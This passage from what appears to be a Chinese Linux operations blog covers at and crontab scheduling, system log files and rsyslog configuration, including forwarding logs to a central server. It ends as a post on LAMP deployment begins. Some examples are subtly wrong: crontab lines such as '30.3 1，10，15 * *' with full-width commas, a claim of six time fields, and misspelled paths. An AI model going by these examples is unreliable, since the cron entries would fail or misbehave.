所示。</p><table><thead><tr><th>选项</th><th>含义</th></tr></thead><tbody><tr><td>-m</td><td>当 at 工作完成后，无论命令是否输出，都用 E-mail 通知执行 at 命令的用户。</td></tr><tr><td>-c 工作标识号</td><td>显示该 at 工作的实际内容。</td></tr><tr><td>-t 时间</td><td>在指定时间提交工作并执行，时间格式为 [[CC]YY]MMDDhhmm。</td></tr><tr><td>-d</td><td>删除某个工作，需要提供相应的工作标识号（ID），同 atrm 命令的作用相同。</td></tr><tr><td>-l</td><td>列出当前所有等待运行的工作，和 atq 命令具有相同的额作用。</td></tr><tr><td>-f 脚本文件</td><td>指定所要提交的脚本文件。</td></tr></tbody></table><p>另外，表 2 罗列了此命令中关于时间参数可用的以下格式。</p><table><thead><tr><th>格式</th><th>用法</th></tr></thead><tbody><tr><td>HH:MM</td><td>比如 04:00 AM。如果时间已过，则它会在第二天的同一时间执行。</td></tr><tr><td>Midnight（midnight）</td><td>代表 12:00 AM（也就是 00:00）。</td></tr><tr><td>Noon（noon）</td><td>代表 12:00 PM（相当于 12:00）。</td></tr><tr><td>Teatime（teatime）</td><td>代表 4:00 PM（相当于 16:00）。</td></tr><tr><td>英文月名 日期 年份</td><td>比如 January 15 2018 表示 2018 年 1 月 15 号，年份可有可无。</td></tr><tr><td>MMDDYY、MM/DD/YY、MM.DD.YY</td><td>比如 011518 表示 2018 年 1 月 15 号。</td></tr><tr><td>now+时间</td><td>以 minutes、hours、days 或 weeks 为单位，例如 now+5 days 表示命令在 5 天之后的此时此刻执行。</td></tr></tbody></table><p>at 命令只要指定正确的时间，就可以输入需要在指定时间执行的命令。这个命令可以是系统命令，也可以是 Shell 脚本。举几个例子。</p><p>【例 1】</p><pre><code>[coot@localhost ~]# cat /root/hello.sh\#!/bin/bashecho "hello world!!"\#该脚本会打印"hello world!!"[root@localhost ~]# at now +2 minutesat&gt; /root/hello.sh &gt;&gt; /root/hello.log\#执行hello.sh脚本，并把输出写入/root/hello.log文件at&gt; &lt;EOT&gt;\#使用Ctrl+D快捷键保存at任务job 8 at 2013-07-25 20:54 #这是第8个at任务,会在2013年7月25日20:54执行[root@localhost ~]# at -c 8\#查询第8个at任务的内容...省略部分内容...\#主要定义系统的环境变量/root/hello.sh &gt;&gt; /root/hello.log\#可以看到at执行的任务</code></pre><p>【例 2】</p><pre><code>[root@localhost ~J# at 02:00 2013-07-26at&gt; /bin/syncat&gt; /sbin/shutdown -h nowat&gt; &lt;EOT&gt;job 9 at 2013-07-26 02:00\#在指定的时间关机。在一个at任务中是可以执行多个系统命令的</code></pre><p>在使用系统定时任务时，不论执行的是系统命令还是 Shell 脚本，最好使用绝对路径来写命令，这样不容易报错。at 任务一旦使用 <code>Ctrl+D</code> 快捷键保存，实际上写入了 /var/spool/at/ 这个目录，这个目录内的文件可以直接被 atd 服务调用和执行。</p><p>【例 3】atq 命令的用法。</p><pre><code>[root@localhost ~]# atq9 2013-07-26 02：00 a root\#说明root用户有一个at任务在2013年7月26日02：00执行，工作号是9[root@localhost ~]# atrm [工作号]\#删除指定的at任务</code></pre><p>【例 4】atrm 命令的用法。</p><pre><code>[root@localhost ~]# atrm 9[root@localhost ~]# atq\#删除9号at任务，再查询就没有at任务存在了</code></pre><h3 id="3-2-crontab命令：循环执行定时任务"><a href="#3-2-crontab命令：循环执行定时任务" class="headerlink" title="3.2    crontab命令：循环执行定时任务"></a>3.2    crontab命令：循环执行定时任务</h3><p>at 命令只是在指定的时间仅能执行一次任务，但在实际工作中，系统的定时任务一般是需要重复执行的。而 at 命令显然无法满足需求，这是就需要使用 crontab 命令来执行循环定时任务。</p><h4 id="3-2-1-crond-服务"><a href="#3-2-1-crond-服务" class="headerlink" title="3.2.1    crond 服务"></a>3.2.1    crond 服务</h4><p>crontab 命令需要 crond 服务支持。crond 是 Linux 下用来周期地执行某种任务或等待处理某些事件的一个守护进程，和 Windows 中的计划任务有些类似。</p><p>在安装完成操作系统后，默认会安装 crond 服务工具，且 crond 服务默认就是自启动的。crond 进程每分钟会定期检查是否有要执行的任务，如果有，则会自动执行该任务。</p><h4 id="3-2-2-crontab-命令"><a href="#3-2-2-crontab-命令" class="headerlink" title="3.2.2        crontab 命令"></a>3.2.2        crontab 命令</h4><p> crontab 命令和 at 命令类似，也是通过 /etc/cron.allow 和 /etc/cron.deny 文件来限制某些用户是否可以使用 crontab 命令的。而且原则也非常相似：</p><pre><code>- 当系统中有 /etc/cron.allow 文件时，只有写入此文件的用户可以使用 crontab 命令，没有写入的用户不能使用 crontab 命令。同样，如果有此文件，/etc/cron.deny 文件会被忽略，因为 /etc/cron.allow 文件的优先级更高。- 当系统中只有 /etc/cron.deny 文件时，写入此文件的用户不能使用 crontab 命令，没有写入文件的用户可以使用 crontab 命令。- 这个规则基本和 at 命令的规则一致，同样是 /etc/cron.allow 文件比 /etc/cron.deny 文件的优先级高，Linux 系统中默认只有 /etc/cron.deny 文件。</code></pre><p>每个用户都可以实现自己的 crontab 定时任务，只需使用这个用户身份执行“crontab -e”命令即可。当然，这个用户不能写入 /etc/cron.deny 文件。</p><p><strong>crontab 命令的基本格式如下：</strong></p><pre><code>[root@localhost ~]# crontab [选项] [file]注意，这里的 file 指的是命令文件的名字，表示将 file 作为 crontab 的任务列表文件并载入 crontab，若在命令行中未指定文件名，则此命令将接受标准输入（键盘）上键入的命令，并将它们键入 crontab。</code></pre><p><strong>选项功能</strong></p><table><thead><tr><th>选项</th><th>功能</th></tr></thead><tbody><tr><td>-u user</td><td>用来设定某个用户的 crontab 服务，例如 “-u demo” 表示设备 demo 用户的 crontab 服务，此选项一般有 root 用户来运行。</td></tr><tr><td>-e</td><td>编辑某个用户的 crontab 文件内容。如果不指定用户，则表示编辑当前用户的 crontab 文件。</td></tr><tr><td>-l</td><td>显示某用户的 crontab 文件内容，如果不指定用户，则表示显示当前用户的 crontab 文件内容。</td></tr><tr><td>-r</td><td>从 /var/spool/cron 删除某用户的 crontab 文件，如果不指定用户，则默认删除当前用户的 crontab 文件。</td></tr><tr><td>-i</td><td>在删除用户的 crontab 文件时，给确认提示。</td></tr></tbody></table><p>其实 crontab 定时任务非常简单，只需执行“crontab -e”命令，然后输入想要定时执行的任务即可。不过，当我们执行“crontab -e”命令时，打开的是一个空文件，而且操作方法和 Vim 是一致的。那么，这个文件的格式才是我们真正需要学习的内容。文件格式如下：</p><p>[root@localhost ！]# crontab -e<br>#进入 crontab 编辑界面。会打开Vim编辑你的任务<br>* * * * * 执行的任务</p><p>这个文件中是通过 5 个“<em>”来确定命令或任务的执行时间的，这 5 个“</em>”的具体含义如表 2 所示。</p><table><thead><tr><th>项目</th><th>含义</th><th>范围</th></tr></thead><tbody><tr><td>第一个”*”</td><td>一小时当中的第几分钟（minute）</td><td>0~59</td></tr><tr><td>第二个”*”</td><td>一天当中的第几小时（hour）</td><td>0~23</td></tr><tr><td>第三个”*”</td><td>一个月当中的第几天（day）</td><td>1~31</td></tr><tr><td>第四个”*”</td><td>一年当中的第几个月（month）</td><td>1~12</td></tr><tr><td>第五个”*”</td><td>一周当中的星期几（week）</td><td>0~7（0和7都代表星期日）</td></tr></tbody></table><p>在时间表示中，还有一些特殊符号需要学习，如表 3 所示。</p><table><thead><tr><th>特殊符号</th><th>含义</th></tr></thead><tbody><tr><td>*（星号）</td><td>代表任何时间。比如第一个”*”就代表一小时种每分钟都执行一次的意思。</td></tr><tr><td>,（逗号）</td><td>代表不连续的时间。比如”0 8，12，16***命令”就代表在每天的 8 点 0 分、12 点 0 分、16 点 0 分都执行一次命令。</td></tr><tr><td>-（中杠）</td><td>代表连续的时间范围。比如”0 5 ** 1-6命令”，代表在周一到周六的凌晨 5 点 0 分执行命令。</td></tr><tr><td>/（正斜线）</td><td>代表每隔多久执行一次。比如”<em>/10***</em>命令”，代表每隔 10 分钟就执行一次命令。</td></tr></tbody></table><p>当“crontab -e”编辑完成之后，一旦保存退出，那么这个定时任务实际就会写入 /var/spool/cron/ 目录中，每个用户的定时任务用自己的用户名进行区分。而且 crontab 命令只要保存就会生效，只要 crond 服务是启动的。知道了这 5 个时间字段的含义，我们多举几个时间的例子来熟悉一下时间字段，如表 4 所示。</p><table><thead><tr><th>时间</th><th>含义</th></tr></thead><tbody><tr><td>45 22 ***命令</td><td>在 22 点 45 分执行命令</td></tr><tr><td>0 17 ** 1命令</td><td>在每周一的 17 点 0 分执行命令</td></tr><tr><td>0 5 1，15**命令</td><td>在每月 1 日和 15 日的凌晨 5 点 0 分执行命令</td></tr><tr><td>40 4 ** 1-5命令</td><td>在每周一到周五的凌晨 4 点 40 分执行命令</td></tr><tr><td><em>/10 4 **</em>命令</td><td>在每天的凌晨 4 点，每隔 10 分钟执行一次命令</td></tr><tr><td>0 0 1，15 * 1命令</td><td>在每月 1 日和 15 日，每周一个 0 点 0 分都会执行命令，注意：星期几和几日最好不要同时出现，因为它们定义的都是天，非常容易让管理员混淆</td></tr></tbody></table><p>现在我们已经对这 5 个时间字段非常熟悉了，可是在“执行的任务”字段中都可以写什么呢？既可以定时执行系统命令，也可以定时执行某个 Shell 脚本，这里举几个实际的例子。</p><p>【例 1】让系统每隔 5 分钟就向 /tmp/test 文件中写入一行“11”，验证一下系统定时任务是否会执行。</p><pre><code>[root@localhost ~]# crontab -e\#进入编辑界面*/5 * * * * /bin/echo "11" &gt;&gt; /tmp/test</code></pre><p>这个任务在时间工作中没有任何意义，但是可以很简单地验证我们的定时任务是否可以正常执行。如果觉得每隔 5 分钟太长，那就换成“*”，让它每分钟执行一次。而且和 at 命令一样，如果我们定时执行的是系统命令，那么最好使用绝对路径。</p><p>【例 2】让系统在每周二的凌晨 5 点 05 分重启一次。</p><pre><code>[root@localhost ~]# crontab -e5 5 * * 2 /sbin/shutdown -r now</code></pre><p>如果服务器的负载压力比较大，则建议每周重启一次，让系统状态归零。比如绝大多数游戏服务器每周维护一次，维护时最主要的工作就是重启，让系统状态归零。这时可以让我们的服务器自动来定时执行。</p><p>【例 3】在每月 1 日、10 日、15 日的凌晨 3 点 30 分都定时执行日志备份脚本 autobak.sh。</p><pre><code>[root@localhost ~]# crontab -e30.3 1，10，15 * * /root/sh/autobak.sh这些定时任务保存之后，就可以在指定的时间执行了。我们可以使用命令来查看和删除定时任务，命令如下：[root@localhost ~]# crontab -l\#查看root用户的crontab任务*/5 * * * * /bin/echo "11" &gt;&gt; /tmp/test5.5 * * 2 /sbin/shutdown -r now30.3 1，10，15 * * /root/sh/autobak.sh[root@localhost ~]# crontab -r\#删除root用户所有的定时任务。如果只想删除某个定时任务，则可以执行“crontab -e”命令进入\#编辑模式手工删除[root@localhost ~]# crontab -lno crontab for root\#删除后，再查询就没有root用户的定时任务了</code></pre><p>在书写 crontab 定时任务时，需要注意以下几个事项：</p><ul><li><pre><code>- 6 个选项都不能为空，必须填写。如果不确定，则使用“*”代表任意时间。- crontab 定时任务的最小有效时间是分钟，最大有效时间是月。像 2018 年某时执行、3 点 30 分 30 秒这样的时间都不能被识别。- 在定义时间时，日期和星期最好不要在一条定时任务中出现，因为它们都以天为单位，非常容易让管理员混淆。- 在定时任务中，不管是直接写命令，还是在脚本中写命令，最好都使用绝对路径。有时使用相对路径的命令会报错。</code></pre></li></ul><h2 id="四、日志管理"><a href="#四、日志管理" class="headerlink" title="四、日志管理"></a>四、日志管理</h2><h3 id="1、日志文件的作用"><a href="#1、日志文件的作用" class="headerlink" title="1、日志文件的作用"></a>1、日志文件的作用</h3><p>​        日志文件用于记录linux系统的各种运行信息的文件，不同的日志文件记载了不同类型的信息,如Linux内核消息、用户登录事件、程序错误等。 </p><p>​        日志文件对于诊断和解决问题很有帮助，因为linux运行的程序通常把系统的消息和错误写入对应的日志文件，这样系统可以有据可查， 此外,日志还记录了用户绝大多数的操作，当主机遭受攻击时,日志文件还可以帮助寻找攻击者留下的痕迹。</p><h3 id="2、日志文件的分类"><a href="#2、日志文件的分类" class="headerlink" title="2、日志文件的分类"></a>2、日志文件的分类</h3><pre><code>1）内核及系统日志: 内核及系统日志:这种日志数据由系统服务rsyslog同-管理,根据其主配置文件/etc/rsyslog.conf中的设置决定将内核消息及各种系统程序消息记录到什么位置。系统中大部分的程序会把自己的日志文件交由rsyslog管理,因而这些应用程序使用的日志记录格式都很相似。**2）用户日志:** 用于记录Linux系统用户登录及退出系统的相关信息,包括用户名、登录的终端、登录时间、来源主机、正在使用的进程操作等。 **3）程序旧志** :有些应用程序会选择独立管理一份日志文件 ,而不是交给rsyslog服务管理,用于记录本程序运行过程中的各种事件信息。于这些程序只负责管理自己的日志文件,因此不同程序所使用的日志记录格式也会存在较大的差异。</code></pre><h3 id="3、日志文件的位置"><a href="#3、日志文件的位置" class="headerlink" title="3、日志文件的位置"></a>3、日志文件的位置</h3><p><strong>Linux系统本身和大部分服务器程序的日志文件默认放在/var/log/下。</strong> </p><pre><code>部分程序共用一个日志文件,一部分程序使用单个日志文件。 而有些大型服务器程序日志由于日志文件不止一个,所以会在/var/log/目录中建立相应的子绿来存放日志文件,这样既保证了日志文件目录的结构清晰,又可以快速定位日志文件。有一部分日志文件只有root用户才有权限读取,这保证了相关日志信息的安全性。</code></pre><h3 id="4、Linux系统中重要的日志文件"><a href="#4、Linux系统中重要的日志文件" class="headerlink" title="4、Linux系统中重要的日志文件"></a>4、Linux系统中重要的日志文件</h3><table><thead><tr><th>日志文件</th><th>说 明</th></tr></thead><tbody><tr><td>/var/log/cron</td><td>记录与系统定时任务相关的曰志</td></tr><tr><td>/var/log/dmesg</td><td>记录了系统在开机时内核自检的信总。也可以使用dmesg命令直接查看内核自检信息</td></tr><tr><td>/var/log/btmp</td><td>记录错误登陆的日志。这个文件是二进制文件，不能直接用Vi查看，而要使用lastb命令查看。命令如下： [root@localhost log]#lastb root tty1 Tue Jun 4 22:38 - 22:38 (00:00) #有人在6月4 日 22:38便用root用户在本地终端 1 登陆错误</td></tr><tr><td>/var/log/lastlog</td><td>记录系统中所有用户最后一次的登录时间的曰志。这个文件也是二进制文件.不能直接用Vi 查看。而要使用lastlog命令查看</td></tr><tr><td>/var/Iog/mailog</td><td>记录邮件信息的曰志</td></tr><tr><td>/var/log/messages</td><td>它是核心系统日志文件，其中包含了系统启动时的引导信息，以及系统运行时的其他状态消息。I/O 错误、网络错误和其他系统错误都会记录到此文件中。其他信息，比如某个人的身份切换为 root，已经用户自定义安装软件的日志，也会在这里列出。</td></tr><tr><td>/var/log/secure</td><td>记录验证和授权方面的倍息，只要涉及账户和密码的程序都会记录，比如系统的登录、ssh的登录、su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td></tr><tr><td>/var/log/wtmp</td><td>永久记录所有用户的登陆、注销信息，同时记录系统的后动、重启、关机事件。同样，这个文件也是二进制文件.不能直接用Vi查看，而要使用last命令查看</td></tr><tr><td>/var/tun/ulmp</td><td>记录当前已经登录的用户的信息。这个文件会随着用户的登录和注销而不断变化，只记录当前登录用户的信息。同样，这个文件不能直接用Vi查看，而要使用w、who、users等命令查看</td></tr></tbody></table><h3 id="5、rsyslogd服务介绍"><a href="#5、rsyslogd服务介绍" class="headerlink" title="5、rsyslogd服务介绍"></a>5、rsyslogd服务介绍</h3><p>系统中的绝大多数日志文件是由 rsyslogd 服务来统一管理的，只要各个进程将信息给予这个服务，它就会自动地把日志按照特定的格式记录到不同的日志文件中。也就是说，采用 rsyslogd 服务管理的日志文件，它们的格式应该是统一的。</p><p>在 Linux 系统中有一部分日志不是由 rsyslogd 服务来管理的，比如 apache 服务，它的日志是由 Apache 软件自己产生并记录的，并没有调用 rsyslogd 服务。但是为了便于读取，apache 日志文件的格式和系统默认日志的格式是一致的。</p><h4 id="1）rsyslog-conf配置文件内容"><a href="#1）rsyslog-conf配置文件内容" class="headerlink" title="1）rsyslog.conf配置文件内容"></a>1）rsyslog.conf配置文件内容</h4><p><code>rsyslog.conf</code>配置文件的位置在<code>/etc/</code>目录下</p><p><code>rsyslog.conf</code>配置文件说明</p><pre class="line-numbers language-shell"><code class="language-shell"># 查看/etc/rsyslog.conf配置文件的内容。[root@localhost ~]# vim /etc/rsyslog.conf# rsyslog v5 configuration file# For more information see /usr/share/doc/rsyslog-*/rsyslog_conf.html# If you experience problems, see http://www.rsyslog.com/doc/troubleshoot.html# 加载模块。是`rsyslogd`服务必备的模块。#### MODULES ##### 加载imuxsock模块，为本地系统登录提供支持。$ModLoad imuxsock # provides support for local system logging (e.g. via logger command)# 加载imklog模块，为内核登录提供支持。$ModLoad imklog   # provides kernel logging support (previously done by rklogd)# 加载immark模块，提供标记信息的能力。#$ModLoad immark  # provides --MARK-- message capability# 如果你需要把日志发送给其他的服务器，# 你就需要开启下面的UPD或者TCP协议的网络服务。# 加载UPD模块，允许使用UDP的514端口，接收采用UDP协议转发的日志。# Provides UDP syslog reception#$ModLoad imudp#$UDPServerRun 514# 加载TCP模块，允许使用TCP的514端口，接收采用TCP协议转发的日志。# Provides TCP syslog reception#$ModLoad imtcp#$InputTCPServerRun 514# 定义全局设置。#### GLOBAL DIRECTIVES ##### 定义日志的时间，使用默认的时间戳格式。# Use default timestamp format$ActionFileDefaultTemplate RSYSLOG_TraditionalFileFormat# 文件同步功能。默认没有开启，是注释的。# File syncing capability is disabled by default. This feature is usually not required,# not useful and an extreme performance hit#$ActionFileEnableSync on# 包含/etc/rsyslog.d/目录中所有的“.conf"子配置文件。# 也就是说这个目录中的所有子配置文件也同时生效。# Include all config files in /etc/rsyslog.d/$IncludeConfig /etc/rsyslog.d/*.conf# 日志文件保存规则。#### RULES ##### kern服务.所有日志级别保存在/dev/console。# 这个日志默认没有开启，如果需要，则取消注释。# Log all kernel messages to the console.# Logging much else clutters up the screen.#kern.*                                                 /dev/console# *.info;mail.none;authpriv.none;cron.none意思是：# 所有服务.info以上级别的日志，保存在/var/log/messages日志中。# 除了mail，authpriv，cron的日志不记录在/var/log/messages日志文件中，因为它们都有自己的日志文件。# 所以/var/log/messages日志，是最重要的系统日志文件，需要经常查看！# Log anything (except mail) of level info or higher.# Don't log private authentication messages!*.info;mail.none;authpriv.none;cron.none                /var/log/messages# 用户认证服务所有级别的日志，保存在/var/log/secure日志中。# The authpriv file has restricted access.authpriv.*                                              /var/log/secure# mail服务的所有级别的日志保存在/var/log/maillog日志中。# “-”号的含义是日志先在内存之中保存，当日志够多之后，再向文件中保存。# Log all the mail messages in one place.mail.*                                                  -/var/log/maillog# 计划任务的所有日志保存在/var/log/cron日志中。# Log cron stuffcron.*                                                  /var/log/cron# 所有日志服务的疼痛等级日志对所有在线用户广播。# Everybody gets emergency messages*.emerg                                                 *# uucp和news日志服务的crit以上的日志保存在/var/log/sppoler 日志文件中。# Save news errors of level crit and higher in a special file.uucp,news.crit                                          /var/log/spooler# loac17日志服务的所有日志写入/var/log/boot.log日志中。# 会把开机时的检测信息在显示到屏幕的同时，写入/var/log/boot.log日志中# Save boot messages also to boot.loglocal7.*                                                /var/log/boot.log# 定义转发规则# ### begin forwarding rule #### The statement between the begin ... end define a SINGLE forwarding# rule. They belong together, do NOT split them. If you create multiple# forwarding rules, duplicate the whole block!# Remote Logging (we use TCP for reliable delivery)## An on-disk queue is created for this action. If the remote host is# down, messages are spooled to disk and sent when it is up again.#$WorkDirectory /var/lib/rsyslog # where to place spool files#$ActionQueueFileName fwdRule1 # unique name prefix for spool files#$ActionQueueMaxDiskSpace 1g   # 1gb space limit (use as much as possible)#$ActionQueueSaveOnShutdown on # save messages to disk on shutdown#$ActionQueueType LinkedList   # run asynchronously#$ActionResumeRetryCount -1    # infinite retries if host is down# remote host is: name/ip:port, e.g. 192.168.0.1:514, port optional#*.* @@remote-host:514# ### end of the forwarding rule ###<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2）rsyslog-conf配置文件内容说明"><a href="#2）rsyslog-conf配置文件内容说明" class="headerlink" title="2）rsyslog.conf配置文件内容说明"></a>2）rsyslog.conf配置文件内容说明</h4><h5 id="etc-rsyslog-conf配置文件格式"><a href="#etc-rsyslog-conf配置文件格式" class="headerlink" title="/etc/rsyslog.conf配置文件格式"></a>/etc/rsyslog.conf配置文件格式</h5><pre class="line-numbers language-shell"><code class="language-shell">格式：#服务名称[连接符号]日志等级           日志记录位置authpriv.*                      /var/log/secure说明：认证相关服务．所有日志等级           记录在/var/log/secure日志中。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="服务名称"><a href="#服务名称" class="headerlink" title="服务名称"></a>服务名称</h5><p><code>rsyslogd</code>服务可以识别以下服务的日志，也可以理解为，以下这些服务委托了<code>rsyslogd</code>服务来代为管理日志。</p><table><thead><tr><th>服务名称</th><th>说明</th></tr></thead><tbody><tr><td>auth (LOG_AUTH)</td><td>安全和认证相关消息（不推荐使用authpriv替代）。</td></tr><tr><td>authpriv (LOG_AUTHPRIV)</td><td>安全和认证相关消息（私有的）。</td></tr><tr><td>cron (LOG_CRON)</td><td>系统定时任务cront和at产生的日志。</td></tr><tr><td>daemon (LOG_DAEMON)</td><td>和各个守护进程相关的日志。</td></tr><tr><td>ftp (LOG_FTP)</td><td>ftp守护进程产生的日志。</td></tr><tr><td>kern (LOG_KERN)</td><td>内核产生的日志（不是用户进程产生的）。</td></tr><tr><td>local0-local7 (LOG_LOCAL0-7)</td><td>为本地使用预留的服务。</td></tr><tr><td>lpr (LOG_LPR)</td><td>打印产生的日志。</td></tr><tr><td>mail (LOG_MAIL)</td><td>邮件收发信息。</td></tr><tr><td>news (LOG_NEWS)</td><td>与新闻服务器相关的日志。</td></tr><tr><td>syslog (LOG_SYSLOG)</td><td>有syslogd服务产生的日志信息<br>（虽然服务名称已经改为rsyslogd，但是很多配置都还是沿用了syslogd的，这里并没有修改服务名）。</td></tr><tr><td>user (LOG_USER)</td><td>用户等级类别的日志信息。</td></tr><tr><td>uucp (LOG_UUCP)</td><td>uucp子系统的日志信息，uucр是早Linux系统进行数据传递的协议，后来也常用在新闻组服务中。</td></tr></tbody></table><h5 id="连接符号"><a href="#连接符号" class="headerlink" title="连接符号"></a>连接符号</h5><p>日志服务连接日志等级的格式是：</p><pre class="line-numbers language-shell"><code class="language-shell">日志服务[连接符号]日志等级      日志记录位置<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在这里连接符号可以识别为：</p><ul><li><pre><code>`.`代表只要比后面的等级高的（包含该等级）日志都记录下来。  比如：`cron.info`代表`cron`服务产生的日志，只要日志等级大于等于`info`级别，就记录。`.=`代表只记录所需等级的日志，其他等级的都不记录。  比如：`*.=emerg`代表任何日志服务产生的日志信息，只要等级是`emerg`等级就记录。（这种方式用的很少）`.!`代表不等于，也就是除了该等级的日志外，其他等级的日志都记录。</code></pre></li></ul><h5 id="日志等级"><a href="#日志等级" class="headerlink" title="日志等级"></a>日志等级</h5><table><thead><tr><th>等级名称</th><th>说明</th></tr></thead><tbody><tr><td>debug (LOG_DEBUG)</td><td>一般的调试信息说明。</td></tr><tr><td>info (LOG_INFO)</td><td>基本的通知信息。</td></tr><tr><td>notice (LOG_NOTICE)</td><td>普通信息，但是有一定的重要性。</td></tr><tr><td>warning (LOG_WARNING)</td><td>警告信息，但是还不会影响到服务或系统的运行。</td></tr><tr><td>err (LOG_ERR)</td><td>错误信息，一般达到err等级的信息，已经可以影响到服务或系统的运行了。</td></tr><tr><td>crit (LOG_CRIT)</td><td>临界状况信息，比err等级还要严重。</td></tr><tr><td>alert (LOG_ALERT)</td><td>警告状态信息，比crit还要严重。必须立即采取行动。</td></tr><tr><td>emerg (LOG_EMERG)</td><td>疼痛等级的日志信息，系统已经无法使用了。</td></tr><tr><td>*</td><td>代表所有日志等级，比如：”authpriv.*”代表authpriv认证信息服务产生的日志，所有的日志等级都记录。</td></tr></tbody></table><p><code>debug</code>日志等级最低， <code>emerg</code>日志等级最高。日志等级低，他记录的日志信息可能就会多些。</p><h5 id="日志记录位置"><a href="#日志记录位置" class="headerlink" title="日志记录位置"></a>日志记录位置</h5><p>日志记录位置就是当前日志输出到哪个日志文件中保存，当然也可以把日志输出到打印机打印，或者输出到远程日志服务器上（当然日志服务器要允许接收才行）。日志的记录位置也是固定的，我们来学习下：</p><ul><li><pre><code>- 日志文件的绝对路径。这是最常见的日志保存方法，如`/var/log/secure`就是保存系统验证和授权信息日志的。- 系统设备文件。如`/dev/lp0`代表第一台打印机，如果日志保存位置是打印机设备的话，当有日志时就会在打印机打印（现在基本上没有这种情况了，请放弃）。- 转发给远程主机。因为可以选择使用TCP协议和UDP协议传输日志信息，所以有两种发送格式。  如果使用`@192.168.0.210：514`，就会把日志内容使用UDP协议发送到`192.168.0.210的UDP 514端口上`，  如果使用`@@192.168.0.210：514`就会把日志内容使用TCP协议发送到`192.168.0.210的TCP 514端口上`。  其中514是日志服务默认端口。（知道有这个功能即可）  当然只要`192.168.0.210`服务器同意接收此日志，就可以把日志内容保存在日志服务器上。- 用户名。如"root"，就会把日志发送给root用户，当然root要在在线，否则就收不到日志信息了。  发送日志给用户时，可以使用`*`代表发送给所有在线用户，如`mail.emerg *`就会把mail服务产生的所有级别的日志发送给所有在线用户。  如果需要把日志发送给多个在线用户，用户名之间用`，`分隔。- `~`：忽略或丢弃日志。如果接受日志的对象是`~`，代表这个日志不会记录，而被直接丢弃。  例如`local3.* ~`代表忽略local3服务类型所有的日志都不记录。</code></pre></li></ul><pre><code>### 6、rsyslogd日志集中管理Linux上通常可以通过rsyslog来实现系统日志的集中管理，这种情况下通常会有一个日志服务器，然后每个机器配置自己日志通过rsyslog来写到远程的日志服务器上。 **任务实战**假定有两台服务器，一台作为系统日志的服务器（比如机器名logmaster），另一台作为日志的客户端（比如机器名logclient）</code></pre><p>logmaster日志服务器配置</p><p>首先修改log master机器上的/etc/rsyslog.conf文件，将其中下面四行的注释取消</p><p>$ModLoad imudp<br>$UDPServerRun 514<br>$ModLoad imtcp<br>$InputTCPServerRun 514</p><p>然后重新启动rsyslogd服务</p><p>systemctl restart rsyslog.service</p><pre><code></code></pre><p>logclient日志客户端配置</p><p>修改/etc/rsyslog.conf文件,在最后加上如下行，目的是让Linux写日志的同时写一份到远端的log mater机器上,@@是tcp，@是UDP </p><p><em>.</em>     @logmaster</p><p>重新启动rsyslogd服务<br>systemctl restart rsyslog.service</p><pre><code></code></pre><p>测试</p><p>在Linxu上可以使用logger命令来写入一条系统日志，比如</p><p>$ logger ‘hello world’</p><p>然后查看log master机器上的/var/log/messages文件，可以看到类似下面的内容</p><p>Jun 28 14:58:16 logclient root: hello world</p><p>其中包括了日期，日志来源（机器名称），进程名和日志内容。</p><pre><code></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网络运维篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LAMP部署</title>
      <link href="/posts/a8d3d305.html"/>
      <url>/posts/a8d3d305.html</url>
      
        <content type="html"><![CDATA[<h1 id="LAMP部署"><a href="#LAMP部署" class="headerlink" title="LAMP部署"></a>LAMP部署</h1><h2 id="一、LAMP介绍"><a href="#一、LAMP介绍" class="headerlink" title="一、LAMP介绍"></a>一、LAMP介绍</h2><h3 id="1、LAMP简介"><a href="#1、LAMP简介" class="headerlink" title="1、LAMP简介"></a>1、LAMP简介</h3><p>LAMP网站框架是目前国际上流行的Web服务架构，该框架包括GNU / Linux 操作系统，Apache HTTP服务器，MySQL 类关系型数据库（RDBMS）以及PHP编程语言。所有组成产品均属于开源类软件 ，本身都是各自独立的程序，但是因为常被放在一起使用，拥有了越来越高的兼容度，使其更适用于构建动态网站及开发Web应用程序， 现已成为国际流行的框架架构。</p><p>目前很多流行的商业应用都是采取这个架构，和Java/J2EE架构相比，LAMP具有Web资源丰富、轻量、快速开发等特点，与微软的.NET架构相比，LAMP具有通用、跨平台、高性能、低价格的优势，因此LAMP无论是性能、质量还是价格都是企业搭建网站的首选平台。</p><h3 id="2、LAMP组件"><a href="#2、LAMP组件" class="headerlink" title="2、LAMP组件"></a>2、LAMP组件</h3><pre><code>   L：很显然L代表Linux系统，但此L需注意系统的版本号，如Centos6.9或Centos7.3；   A：表示apache，在传统行业中，多数采用Apache服务器，因此也很有必要了解学习Apache；   M：表示数据库，多数采用mysql或mariadb，作为专业的数据库工程师需经多年的历练；   P：表示PHP、python、perl等等编程语言。</code></pre><h3 id="3、LAMP工作过程"><a href="#3、LAMP工作过程" class="headerlink" 